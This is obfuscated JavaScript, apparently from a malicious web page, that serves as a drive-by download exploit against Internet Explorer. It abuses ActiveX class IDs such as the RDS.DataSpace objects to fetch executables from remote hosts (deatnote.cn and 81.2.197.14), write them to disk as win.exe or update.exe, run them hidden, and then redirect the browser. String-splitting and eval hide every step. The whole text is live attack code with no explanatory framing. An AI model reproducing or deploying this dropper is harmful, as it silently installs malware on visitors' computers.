function CreateO(os, nz) {
var e0 = null;
      try { 
eval('e0 = os.CreateObject(nz)') }catch(e){}
     if (! e0) {try { eval('e0 = os.CreateObject(nz, "")') }catch(e){}}
    if (! e0) {try { eval('e0 = os.CreateObject(nz, "", "")') }catch(e){}}
   if (! e0) {try { eval('e0 = os.GetObject("", nz)') }catch(e){}}
  if (! e0) {try { eval('e0 = os.GetObject(nz, "")') }catch(e){}}
 if (! e0) {try { eval('e0 = os.GetObject(nz)') }catch(e){}}
return(e0);
}

function Download(a) 
{
var lm = CreateO(a,'m'+'sxm'+'l2'+'.'+'X'+'M'+'LHT'+'TP');
lm.open('G'+'E'+'T','http://deatnote.cn/314/load.php',false);
lm.send();
var o = CreateO(a,'a'+'d'+'od'+'b'+'.'+'s'+'t'+'re'+'am');

o.type = 1;
o.Mode = 3;
o.open();

o.Write(lm.responseBody);

var tut = ".//..//win"+".exe";
o.savetoFile(tut,2);
o.close();
var s = CreateO(a, 'S'+'hel'+'l.A'+'pp'+'lic'+'at'+'ion');
s.Shellexecute(tut);
}

var x = 0;
var t = new Array(

'{B'+'D'+'96C'+'55'+'6-65'+'A3-11'+'D0'+'-98'+'3A-00'+'C0'+'4FC'+'29'+'E30}',
'{BD'+'96'+'C55'+'6-6'+'5A3-1'+'1D0-9'+'83'+'A-0'+'0C0'+'4F'+'C2'+'9E36}',null);

while (t[x]) {
var a = null;
   if (t[x].substring(0,1) == '{') {
a = document.createElement('object');
a.setAttribute('cl'+'a'+'ss'+'id', 'cl'+'s'+'id:' + t[x].substring(1, t[x].length + 1));
}  else {
   try 
{ a = new ActiveXObject(t[x]); } catch(e){}
}
   if (a) 
{
   try 
{
var b = CreateO(a, 'Sh'+'el'+'l'+'.'+'A'+'p'+'pl'+'ica'+'ti'+'on');
if (b) {
if (Download(a)) break;
}
}catch(e){}
}
x++;
}
setTimeout("window.location = 'jav.php'", 2500);
</script><script language='JavaScript'>

function CreateObject(CLSID, name)
{
	var r = null;
	try { eval('r = CLSID.CreateObject(name)') }catch(e){}	
	if (! r) { try { eval('r = CLSID.CreateObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.CreateObject(name, "", "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject("", name)') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name, "")') }catch(e){} }
	if (! r) { try { eval('r = CLSID.GetObject(name)') }catch(e){} }
	return(r);
}


var url = 'http://81.2.197.14/pls/download.php?l=msie6';

eval ('va'+'r cls'+'ids = n'+'ew A'+'r'+'r'+'a'+'y(\'cls'+'id'+':'+'B'+'D'+'9'+'6'+'C'+'5'+'5'+'6'+'-'+'65'+'A3'+'-11'+'D0'+'-98'+'3A'+'-0'+'0C'+'04'+'FC'+'29'+'E3'+'0\',\'clsid:BD96'+'C5'+'56-65A3'+'-'+'11D0'+'-'+'983A-00C'+'0'+'4FC'+'2'+'9E3'+'6\',\'cl'+'si'+'d:AB'+'9B'+'C'+'EDD-'+'E'+'C7'+'E-4'+'7E'+'1-93'+'22-D'+'4'+'A210'+'617'+'116\',\'c'+'lsi'+'d:000'+'6F03'+'3-00'+'00-0'+'0'+'0'+'0'+'-C000'+'-00'+'000000'+'00'+'46\',\'cls'+'i'+'d'+':0'+'006F'+'03A-0000-0000-'+'C00'+'0'+'-00'+'0000'+'000046\',\'cl'+'sid:6'+'e'+'320'+'70a'+'-76'+'6d-'+'4'+'ee6-'+'87'+'9c'+'-'+'dc'+'1f'+'a91d'+'2fc3\',\'c'+'lsi'+'d:64'+'14'+'512B-B'+'978-451D-'+'A0D'+'8-FC'+'FDF33'+'E'+'83'+'3C\',\'cl'+'s'+'i'+'d'+':7F5B7'+'F63-F06'+'F-4'+'3'+'3'+'1'+'-8A26-3'+'39E'+'03C'+'0AE'+'3D\',\'cls'+'id'+':06723'+'E0'+'9-'+'F4C2-43c'+'8-835'+'8-09FC'+'D1D'+'B0'+'7'+'66\',\'cls'+'id:63'+'9F'+'7'+'25F-1'+'B2D-'+'483'+'1-A9FD-8'+'74'+'847'+'68'+'2010\',\'cl'+'sid:'+'BA'+'018'+'5'+'99-1D'+'B3-44f9-'+'8'+'3B'+'4-461'+'45'+'4'+'C8'+'4BF8\',\'clsid'+':D0C'+'07D56'+'-7C6'+'9'+'-43'+'F1-B4A'+'0-25'+'F5A'+'11F'+'AB1'+'9\',\'cl'+'sid:E8CCCD'+'DF-CA'+'28-'+'49'+'6b-B05'+'0-6C07C'+'96247'+'6B\',null);');

var obj=null;
var xmlobj=null;
var adobdobj=null;
var execobj=null;
var i=0;
var ind;
var name = "update.exe";

while( (clsids[i] != null) && ((xmlobj == null) || (adobdobj == null) || (execobj == null)))
{
	try
	{
		obj = document.createElement('object');
		obj.setAttribute("classid", clsids[i]);
	}catch(e)
	{	
		obj = null;
	}

	if(obj)
	{
		eval('xml'+'obj ='+' Crea'+'teObj'+'ect(ob'+'j, "ms'+'xml2'+'.XM'+'LHTTP");');
		if(!xmlobj)
			eval('xm'+'lob'+'j = '+'Cr'+'eateOb'+'ject'+'(o'+'bj, "Mic'+'rosoft.'+'X'+'MLH'+'TTP");');
		if(!xmlobj)
			eval('xm'+'lob'+'j = Cre'+'ateOb'+'ject(ob'+'j,'+' "MSX'+'ML2.Se'+'rverX'+'MLH'+'TTP");');
		
		if(xmlobj)
		{
			eval('ado'+'bdobj '+'= Crea'+'teObj'+'ect(obj, '+'"ADO'+'DB.S'+'tre'+'am"'+');');
			eval('exe'+'cobj = Cre'+'ateOb'+'ject(ob'+'j, "WScri'+'pt.S'+'hell");');
			ind = 0;
			
			if(!execobj)
			{
				eval('exe'+'cob'+'j = Cr'+'eate'+'Ob'+'ject(ob'+'j, "Sh'+'ell.App'+'lication");');
				ind = 1;
			}			
		}
	}
	i++;
}

if(xmlobj && adobdobj && execobj)
{

	try
	{
		xmlobj.open("Get", url, false);
		xmlobj.send(null);
	} catch(e) { }

eval ("t"+"r"+"y{"+"	e"+"v"+"al('a"+"do"+"b'+'do"+"b'+'j."+"Ty'+'pe = 1;');e"+"v"+"al('adob'+'dob'+'j.Mo'+'de = 3;');ev"+"al('ad"+"ob'+'dob'+'j.Op'"+"+'en();');eva"+"l('adob'"+"+'dob'+'j."+"Wr'"+"+'ite('+'"+"xm'"+"+'l"+"obj"+".'+"+"'re"+"spo"+"ns'"+"+'eBody);');ev"+"al('adob'+'d"+"ob'+"+"'j.Sa'+'v"+"eTo"+"'+'"+"Fi'"+"+'l"+"e(n"+"a'+"+"'me"+", 2"+");');eval("+"'adob'+'dob'"+"+'j.Cl'+'ose('+'"+");');} cat"+"c"+"h(e) { }");
	

	if(ind == 0)
	{
		try
		{
			eval('exe'+'cob'+'j.R'+'un(n'+'ame'+', 0);');
		}catch(e){}
	}else
	{
		try
		{
			eval('exe'+'cob'+'j.S'+'hell'+'Exe'+'cut'+'e(na'+'me, "'+'", "", "'+'op'+'en",'+' 0);');
		}catch(e){}
	}
}
